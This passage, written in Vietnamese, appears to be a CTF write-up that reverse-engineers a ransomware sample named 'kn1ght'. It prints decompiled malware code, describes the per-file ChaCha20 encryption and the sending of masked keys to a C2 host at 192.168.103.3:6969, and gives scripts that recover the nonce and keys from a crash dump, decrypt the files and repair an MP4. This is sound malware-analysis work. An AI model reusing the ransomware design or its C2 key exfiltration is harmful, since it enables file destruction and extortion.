  if ( !*(_QWORD *)plii )
  {
    s[0] = (SOCKET)plii[1];
    sub_7FF771C275A0(plii, v149, 12LL, &unk_7FF771C5C200);
    sub_7FF771C26EB0(hObject, plii);
    v68 = v135;
    if ( v135 )
    {
      v69 = (char *)hObject[0];
      while ( 1 )
      {
        sub_7FF771C36050(plii, s, v69, v68);
        if ( plii[0] )
        {
          v70 = (char **)plii[1];
          switch ( plii[1].cbSize & 3 )
          {
            case 0:
              if ( *(_BYTE *)(*(_QWORD *)&plii[1] + 16LL) == 35 )
                goto LABEL_118;
              goto LABEL_243;
            case 1:
              if ( *(_BYTE *)(*(_QWORD *)&plii[1] + 15LL) == 35 )
              {
                v149 = *(_QWORD *)&plii[1] - 1LL;
                JUMPOUT(0x7FF771C23B5ELL);
              }
              goto LABEL_243;
            case 2:
              goto LABEL_243;
            case 3:
              if ( plii[1].dwTime != 35 )
                goto LABEL_243;
              goto LABEL_118;
          }
        }
        if ( !*(_QWORD *)&plii[1] )
          break;
        if ( v68 < *(_QWORD *)&plii[1] )
          sub_7FF771C5AA00(*(_QWORD *)&plii[1], v68, &off_7FF771C5C4D8);
        v69 += *(_QWORD *)&plii[1];
        v68 -= *(_QWORD *)&plii[1];
LABEL_118:
        if ( !v68 )
          goto LABEL_129;
      }
      v70 = &off_7FF771C5C470;
LABEL_243:
      plii[0] = (tagLASTINPUTINFO)v70;
      v74 = (char ***)sub_7FF771C27550(8LL, 8LL);
      if ( !v74 )
        sub_7FF771C5A4A0(8LL, 8LL);
LABEL_244:
      v6 = (__int64)v74;
      *v74 = v70;
    }
    else
    {
LABEL_129:
      v71 = 6LL;
      v72 = "kn1ght";
      do
      {
        sub_7FF771C36050(plii, s, v72, v71);
        if ( plii[0] )
        {
          v70 = (char **)plii[1];
          switch ( plii[1].cbSize & 3 )
          {
            case 0:
              if ( *(_BYTE *)(*(_QWORD *)&plii[1] + 16LL) == 35 )
                continue;
              goto LABEL_145;
            case 1:
              if ( *(_BYTE *)(*(_QWORD *)&plii[1] + 15LL) == 35 )
              {
                v149 = *(_QWORD *)&plii[1] - 1LL;
                JUMPOUT(0x7FF771C23C74LL);
              }
              goto LABEL_145;
            case 2:
              goto LABEL_145;
            case 3:
              if ( plii[1].dwTime != 35 )
                goto LABEL_145;
              continue;
          }
        }
        if ( !*(_QWORD *)&plii[1] )
        {
          v70 = &off_7FF771C5C470;
LABEL_145:
          plii[0] = (tagLASTINPUTINFO)v70;
          v74 = (char ***)sub_7FF771C27550(8LL, 8LL);
          if ( !v74 )
            sub_7FF771C5A4A0(8LL, 8LL);
          goto LABEL_244;
        }
        if ( v71 < *(_QWORD *)&plii[1] )
          sub_7FF771C5AA00(*(_QWORD *)&plii[1], v71, &off_7FF771C5C4D8);
        v72 += *(_QWORD *)&plii[1];
        v71 -= *(_QWORD *)&plii[1];
      }
      while ( v71 );
      AcquireSRWLockExclusive(&SRWLock);
      if ( 2 * *off_7FF771C6D080 )
      {
        v73 = sub_7FF771C59900();
        LOBYTE(v73) = v73 ^ 1;
      }
      else
      {
        v73 = 0;
      }
      LODWORD(v141) = v73;
      if ( byte_7FF771C6D008 )
      {
        plii[0] = (tagLASTINPUTINFO)&SRWLock;
        LOBYTE(plii[1].cbSize) = v141;
        sub_7FF771C5A960(
          (unsigned int)aCalledResultUn,
          43,
          (unsigned int)plii,
          (unsigned int)&off_7FF771C5B680,
          (__int64)&off_7FF771C5C190);
      }
      sub_7FF771C275A0(plii, qword_7FF771C6D010, qword_7FF771C6D020, &unk_7FF771C5C200);
      sub_7FF771C26EB0(&v137, plii);
      v75 = v137;
      v76 = v138;
      if ( !(_QWORD)v138 )
      {
LABEL_163:
        if ( *((_QWORD *)&v137 + 1) )
          sub_7FF771C27560(v75, *((_QWORD *)&v137 + 1), 1LL);
        if ( !(_BYTE)v141 && 2 * *off_7FF771C6D080 && !(unsigned __int8)sub_7FF771C59900() )
          byte_7FF771C6D008 = 1;
        ReleaseSRWLockExclusive(&SRWLock);
        if ( hObject[1] )
          sub_7FF771C27560(hObject[0], hObject[1], 1LL);
        closesocket(s[0]);
        goto LABEL_169;
      }
      v77 = v137;
      while ( 1 )
      {
        sub_7FF771C36050(plii, s, v77, v76);
        if ( plii[0] )
        {
          v78 = (char **)plii[1];
          switch ( plii[1].cbSize & 3 )
          {
            case 0:
              if ( *(_BYTE *)(*(_QWORD *)&plii[1] + 16LL) == 35 )
                goto LABEL_152;
              goto LABEL_260;
            case 1:
              if ( *(_BYTE *)(*(_QWORD *)&plii[1] + 15LL) == 35 )
              {
                v149 = *(_QWORD *)&plii[1] - 1LL;
                JUMPOUT(0x7FF771C23E43LL);
              }
              goto LABEL_260;
            case 2:
              goto LABEL_260;
            case 3:
              if ( plii[1].dwTime != 35 )
                goto LABEL_260;
              goto LABEL_152;
          }
        }
        if ( !*(_QWORD *)&plii[1] )
          break;
        if ( v76 < *(_QWORD *)&plii[1] )
          sub_7FF771C5AA00(*(_QWORD *)&plii[1], v76, &off_7FF771C5C4D8);
        v77 += *(_QWORD *)&plii[1];
        v76 -= *(_QWORD *)&plii[1];
LABEL_152:
        if ( !v76 )
          goto LABEL_163;
      }
      v78 = &off_7FF771C5C470;
LABEL_260:
      plii[0] = (tagLASTINPUTINFO)v78;
      v119 = (char ***)sub_7FF771C27550(8LL, 8LL);
      if ( !v119 )
        sub_7FF771C5A4A0(8LL, 8LL);
      v6 = (__int64)v119;
      *v119 = v78;
      if ( *((_QWORD *)&v137 + 1) )
        sub_7FF771C27560(v75, *((_QWORD *)&v137 + 1), 1LL);
      if ( !(_BYTE)v141 && 2 * *off_7FF771C6D080 && !(unsigned __int8)sub_7FF771C59900() )
        byte_7FF771C6D008 = 1;
      ReleaseSRWLockExclusive(&SRWLock);
    }
    if ( hObject[1] )
      sub_7FF771C27560(hObject[0], hObject[1], 1LL);
    closesocket(s[0]);
    goto LABEL_248;
  }
  v65 = plii[1];
  *(tagLASTINPUTINFO *)&v137 = plii[1];
  plii[0] = (tagLASTINPUTINFO)&off_7FF771C5C1B0;
  plii[1] = (tagLASTINPUTINFO)1LL;
  *(_QWORD *)v143 = &off_7FF771C5B5F0;
  *(_OWORD *)&v143[8] = 0LL;
  sub_7FF771C349F0(plii);
  if ( (unsigned __int64)(v65.cbSize & 3) - 2 >= 2 && (v65.cbSize & 3) != 0 )
  {
    v149 = *(_QWORD *)&v65 - 1LL;
    v66 = *(void (***)(void))(*(_QWORD *)&v65 + 7LL);
    v151 = *(void (***)(void))(*(_QWORD *)&v65 - 1LL);
    v150 = v66;
    (*v66)();
    v67 = v150[1];
    if ( v67 )
      sub_7FF771C27560(v151, v67, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
LABEL_169:
  v79 = sub_7FF771C22830();
  v80 = v79;
  if ( v79 )
  {
    plii[0] = (tagLASTINPUTINFO)v79;
    v81 = (__int64 *)sub_7FF771C27550(8LL, 8LL);
    if ( !v81 )
      sub_7FF771C5A4A0(8LL, 8LL);
    v6 = (__int64)v81;
    *v81 = v80;
LABEL_248:
    if ( v147 )
      ((void (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_7FF771C27560)(v146, v147, 1LL);
LABEL_250:
    if ( *((_QWORD *)&v127 + 1) )
      sub_7FF771C27560(v127, *((_QWORD *)&v127 + 1), 1LL);
    if ( v130 )
      sub_7FF771C27560(v129, v130, 1LL);
    v17 = v122;
    if ( !v122 )
      goto LABEL_27;
    goto LABEL_26;
  }
  Sleep(0x2710u);
  v82 = sub_7FF771C3E7B0(aCWindowsSystem, 31LL);
  if ( v82 && (unsigned __int64)(v82 & 3) - 2 >= 2 && (v82 & 3) != 0 )
  {
    v149 = v82 - 1;
    v83 = *(void (***)(void))(v82 - 1);
    v84 = *(void (***)(void))(v82 + 7);
    v151 = v83;
    v150 = v84;
    (*v84)();
    v85 = v150[1];
    if ( v85 )
      sub_7FF771C27560(v151, v85, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
  v86 = sub_7FF771C3E7B0(aCWindowsPrefet, 19LL);
  if ( v86 && (unsigned __int64)(v86 & 3) - 2 >= 2 && (v86 & 3) != 0 )
  {
    v149 = v86 - 1;
    v87 = *(void (***)(void))(v86 - 1);
    v88 = *(void (***)(void))(v86 + 7);
    v151 = v87;
    v150 = v88;
    (*v88)();
    v89 = v150[1];
    if ( v89 )
      sub_7FF771C27560(v151, v89, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
  v90 = sub_7FF771C3E7B0(aCWindowsTemp, 15LL);
  if ( v90 && (unsigned __int64)(v90 & 3) - 2 >= 2 && (v90 & 3) != 0 )
  {
    v149 = v90 - 1;
    v91 = *(void (***)(void))(v90 - 1);
    v92 = *(void (***)(void))(v90 + 7);
    v151 = v91;
    v150 = v92;
    (*v92)();
    v93 = v150[1];
    if ( v93 )
      sub_7FF771C27560(v151, v93, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
  v94 = sub_7FF771C3E7B0(aCUsersPublicDo, 32LL);
  if ( v94 && (unsigned __int64)(v94 & 3) - 2 >= 2 && (v94 & 3) != 0 )
  {
    v149 = v94 - 1;
    v95 = *(void (***)(void))(v94 - 1);
    v96 = *(void (***)(void))(v94 + 7);
    v151 = v95;
    v150 = v96;
    (*v96)();
    v97 = v150[1];
    if ( v97 )
      sub_7FF771C27560(v151, v97, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
  v98 = sub_7FF771C3E7B0(aCRecycleBin, 15LL);
  if ( v98 && (unsigned __int64)(v98 & 3) - 2 >= 2 && (v98 & 3) != 0 )
  {
    v149 = v98 - 1;
    v99 = *(void (***)(void))(v98 - 1);
    v100 = *(void (***)(void))(v98 + 7);
    v151 = v99;
    v150 = v100;
    (*v100)();
    v101 = v150[1];
    if ( v101 )
      sub_7FF771C27560(v151, v101, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
  v102 = sub_7FF771C3E7B0(aCWindowsLogs, 15LL);
  if ( v102 && (unsigned __int64)(v102 & 3) - 2 >= 2 && (v102 & 3) != 0 )
  {
    v149 = v102 - 1;
    v103 = *(void (***)(void))(v102 - 1);
    v104 = *(void (***)(void))(v102 + 7);
    v151 = v103;
    v150 = v104;
    (*v104)();
    v105 = v150[1];
    if ( v105 )
      sub_7FF771C27560(v151, v105, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
  v106 = sub_7FF771C3E7B0(aCWindowsTemp, 15LL);
  if ( v106 && (unsigned __int64)(v106 & 3) - 2 >= 2 && (v106 & 3) != 0 )
  {
    v149 = v106 - 1;
    v107 = *(void (***)(void))(v106 - 1);
    v108 = *(void (***)(void))(v106 + 7);
    v151 = v107;
    v150 = v108;
    (*v108)();
    v109 = v150[1];
    if ( v109 )
      sub_7FF771C27560(v151, v109, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
  v110 = sub_7FF771C3E7B0(aCWindowsSystem_0, 26LL);
  if ( v110 && (unsigned __int64)(v110 & 3) - 2 >= 2 && (v110 & 3) != 0 )
  {
    v149 = v110 - 1;
    v111 = *(void (***)(void))(v110 - 1);
    v112 = *(void (***)(void))(v110 + 7);
    v151 = v111;
    v150 = v112;
    (*v112)();
    v113 = v150[1];
    if ( v113 )
      sub_7FF771C27560(v151, v113, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
  v114 = sub_7FF771C3E7B0(aCWindowsSoftwa, 31LL);
  if ( v114 && (unsigned __int64)(v114 & 3) - 2 >= 2 && (v114 & 3) != 0 )
  {
    v149 = v114 - 1;
    v115 = *(void (***)(void))(v114 - 1);
    v116 = *(void (***)(void))(v114 + 7);
    v151 = v115;
    v150 = v116;
    (*v116)();
    v117 = v150[1];
    if ( v117 )
      sub_7FF771C27560(v151, v117, v150[2]);
    sub_7FF771C27560(v149, 24LL, 8LL);
  }
  Sleep(0x2710u);
  if ( v147 )
    ((void (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_7FF771C27560)(v146, v147, 1LL);
  if ( *((_QWORD *)&v127 + 1) )
    sub_7FF771C27560(v127, *((_QWORD *)&v127 + 1), 1LL);
  if ( v130 )
    sub_7FF771C27560(v129, v130, 1LL);
  if ( v122 )
    sub_7FF771C27560(v121, v122, 1LL);
  if ( *((_QWORD *)&v123 + 1) )
    sub_7FF771C27560(v123, *((_QWORD *)&v123 + 1), 1LL);
  if ( *((_QWORD *)&v125 + 1) )
    sub_7FF771C27560(v125, *((_QWORD *)&v125 + 1), 1LL);
  v118 = v136;
  v19 = (*v136)-- == 1LL;
  if ( v19 )
  {
    v19 = v118[1]-- == 1LL;
    if ( v19 )
      sub_7FF771C27560(v118, 368LL, 16LL);
  }
  return 0LL;
}
```
Malware lấy số ngẫu nhiên từ thread_rng(), định dạng thành chuỗi hex in hoa đệm đủ 24 ký tự ({:024X}) rồi cắt 12 ký tự đầu (mã có bước kiểm tra độ dài ≥ 12 trước khi cắt). 12 ký tự này là tham số thứ 3 của hàm mã hóa và được dùng làm nonce 12 byte, dùng chung cho mọi file. Trong dump, chuỗi gốc 53B79D63306C84B1B41749DF nằm sát C:\Users\user và C:\Users\user\Downloads, đúng thứ tự mã tạo ra.
Phân tích Hàm mã hóa sub_7FF771C21670
Hàm nhận (đường dẫn, nonce), duyệt đệ quy thư mục (thư mục con thì tự gọi lại chính nó) và với mỗi file có phần mở rộng:
1.  Đọc toàn bộ nội dung file vào bộ nhớ.
2.  Sinh khóa ngẫu nhiên 32 byte riêng cho từng file bằng getrandom (sub_...2A4F0(buf, 0x20)).
3.  Khởi tạo cipher sub_...2A580(ctx, key, 32, nonce, 12) rồi mã hóa dạng stream sub_...2A830(ctx, in, len, out, len) (độ dài vào bằng độ dài ra, không padding). Khóa 32 byte + nonce 12 byte khớp ChaCha20 (IETF).
4.  Lấy khóa 32 byte XOR với hai hằng số 128-bit xmmword_7FF771C5B500 và xmmword_7FF771C5B510, rồi nối vào buffer toàn cục (Mutex<Vec<u8>> trong .data, ở 7FF771C6D010: con trỏ, 6D018: capacity, 6D020: length).
5.  Ghi file mới <tên>.<đuôi>.kn1ght rồi xóa file gốc.
Hệ quả: file mã hóa không chứa khóa, không thể giải mã nếu không có buffer khóa trong bộ nhớ hoặc phía C2.
Quan sát thêm: bước lọc để bỏ qua file đã mã hóa so sánh đuôi với knight (chữ i), không phải kn1ght (chữ số 1) mà malware thực sự ghi. Vì vậy file .kn1ght không bị bỏ qua nếu malware chạy lại trên cùng thư mục.
Giao tiếp C2
Các hằng số 0x3931, 0x32, 0x3631, 0x38, 0x3031, 0x33 và dấu . tạo thành chuỗi 192.168.103.3, cộng với cổng 6969. Malware kết nối TCP tới 192.168.103.3:6969, gửi lần lượt:
1.  Chuỗi 12 ký tự nonce.
2.  Marker kn1ght.
3.  Nội dung buffer toàn cục (danh sách khóa đã XOR mask).
Bây giờ chúng ta đi giải mã, từ phân tích mã nguồn , nonce của ChaCha20 là 12 ký tự ASCII đầu của một chuỗi hex in hoa dài 24 ký tự, sinh ngẫu nhiên lúc chạy. Cụ thể, hàm main kiểm tra chuỗi dài ít nhất 12 rồi cắt [..12]. Chương trình còn gửi đúng 12 byte đó về C2 như gói dữ liệu đầu tiên. Vì chuỗi sinh bằng RNG, nó không nằm trong file thực thi mà chỉ tồn tại trong bộ nhớ lúc chạy, nên ta tìm nó trong crash dump.
Script scan.py
```
import re, sys, collections
d = open(sys.argv[1], "rb").read()

# 1) Chuoi hex in hoa dai dung 24 ky tu (loai chuoi lap)
pat = re.compile(rb'(?<![0-9A-Fa-f])[0-9A-F]{24}(?![0-9A-Fa-f])')
c = collections.Counter(m.group() for m in pat.finditer(d) if len(set(m.group())) > 5)
for s, n in c.most_common(30):
    print(n, s.decode())

# 2) Tim ung vien da thay, dang goc va dang giai ma
cand_hex = b"353342373944363333303643"
cand_txt = bytes.fromhex(cand_hex.decode())      # b"53B79D63306C"
for needle in (cand_hex, cand_txt):
    print("== tim", needle)
    for m in re.finditer(re.escape(needle), d):
        o = m.start()
        print(hex(o), d[max(0, o-48):o+72])
```
<img width="1457" height="720" alt="image" src="https://github.com/user-attachments/assets/c4475c54-f8b2-4c3f-a71e-49f73147613b" />

Ứng viên duy nhất có độ ngẫu nhiên thật là 53B79D63306C84B1B41749DF (chuỗi AAAABBBBCCCCDDDDEEEEFFFF là nhiễu). Chuỗi 353342373944363333303643 nằm ngay trước C:\Users\user\Downloads chính là mã hex ASCII của 12 ký tự đầu 53B79D63306C. Vậy nonce là chuỗi ASCII 53B79D63306C (12 byte).
Lấy buffer khóa và mask:

0:000> dq 00007ff7`71c6d000 L8
00007ff7`71c6d010  0000019a`07579e00 00000000`00000100   ; ptr, capacity
00007ff7`71c6d020  00000000`000000e0 00000000`00000000   ; length

0:000> .writemem C:\Users\Public\keys.bin 0000019a`07579e00 L?e0
0:000> .writemem C:\Users\Public\mask.bin 00007ff7`71c5b500 L?20


<img width="946" height="846" alt="image" src="https://github.com/user-attachments/assets/b2b192f4-3dbe-4b3d-8fb4-12f7b6020b30" />


```
import os, sys
from Crypto.Cipher import ChaCha20

KEYS  = r"keys.bin"
MASK  = r"mask.bin"
NONCE = b"53B79D63306C"

blob = open(KEYS, "rb").read()
mask = open(MASK, "rb").read()
assert len(mask) == 32 and len(blob) % 32 == 0, "kiem tra lai keys.bin/mask.bin"
keys = [bytes(a ^ b for a, b in zip(blob[i:i+32], mask))
        for i in range(0, len(blob), 32)]
print(len(keys), "khoa")

def printable(b):
    return all(c in (9, 10, 13) or 32 <= c < 127 for c in b)

def ok(name, p):
    n = name.lower()
    if n.endswith((".mp4.kn1ght", ".heic.kn1ght")): return p[4:8] == b"ftyp"
    if n.endswith((".jpeg.kn1ght", ".jpg.kn1ght")): return p[:3] == b"\xff\xd8\xff"
    if n.endswith(".docx.kn1ght"):                  return p[:4] == b"PK\x03\x04"
    if n.endswith(".txt.kn1ght"):                   return printable(p[:48])
    if n.endswith(".ini.kn1ght"):                   return p[:2] == b"\xff\xfe" or printable(p[:48])
    return False

def make(k, ctr):
    c = ChaCha20.new(key=k, nonce=NONCE)
    if ctr:
        c.seek(64 * ctr)
    return c

indir, outdir = sys.argv[1], sys.argv[2]
os.makedirs(outdir, exist_ok=True)
for fn in sorted(os.listdir(indir)):
    if not fn.endswith(".kn1ght"):
        continue
    ct = open(os.path.join(indir, fn), "rb").read()
    done = False
    for ctr in (0, 1):                      # thu bo dem 0 truoc, roi 1
        for i, k in enumerate(keys):
            if ok(fn, make(k, ctr).decrypt(ct[:64])):
                open(os.path.join(outdir, fn[:-7]), "wb").write(make(k, ctr).decrypt(ct))
                print(f"OK  {fn:28} khoa #{i}  counter={ctr}")
                done = True
                break
        if done:
            break
    if not done:
        print(f"KHONG KHOP  {fn}")
```
<img width="1067" height="573" alt="image" src="https://github.com/user-attachments/assets/33163447-be43-477d-b684-be7f236336a4" />

Mình đã decrypt được những file đã bị mã hóa nhưng mà vẫn chưa có flag, chú ý đến file mp4 thì mình thấy nó bị lỗi , vậy giờ chúng ta cần viết 1 script để fix lại, nhưng trước hết cứ phải biết nó lỗi ở đâu.Mình tiến hành load vào HxD

<img width="1656" height="1011" alt="image" src="https://github.com/user-attachments/assets/cb1d071e-6716-462b-adee-3fd277c955de" />

Trình phát đọc free có size 0 và hiểu rằng free kéo dài đến hết file. Nó nuốt luôn mdat và moov, nên không tìm thấy moov (chứa danh sách track, bảng sample, thời lượng). Không có moov thì video không phát được, dù dữ liệu mdat vẫn nguyên.
Mình viết script để sửa lại hoặc nếu ai thích thì fix hẳn bytes trong HxD cũng được.
```
import struct, sys
src, dst = sys.argv[1], sys.argv[2]
d = bytearray(open(src, "rb").read())

assert d[4:8] == b"ftyp", "khong phai MP4"
o = struct.unpack(">I", d[0:4])[0]

if d[o+4:o+8] == b"free":
    struct.pack_into(">I", d, o, 8)          # free = 8
    o += 8

assert d[o+4:o+8] == b"mdat", f"khong thay mdat tai {hex(o)}"
mdat = o

p = d.rfind(b"moov")
assert p >= 4, "khong tim thay moov"
ms = p - 4

struct.pack_into(">I", d, mdat, ms - mdat)   # mdat = den moov
struct.pack_into(">I", d, ms, len(d) - ms)   # moov = den EOF

print("free=8  mdat=", ms - mdat, " moov=", len(d) - ms)
open(dst, "wb").write(d)
print("Da ghi", dst)
```

Cho chạy script và mở file mp4 lên mình thu được flag.
<img width="1866" height="1078" alt="image" src="https://github.com/user-attachments/assets/6dbb0710-775c-446b-8537-bcafb03a4c1e" />








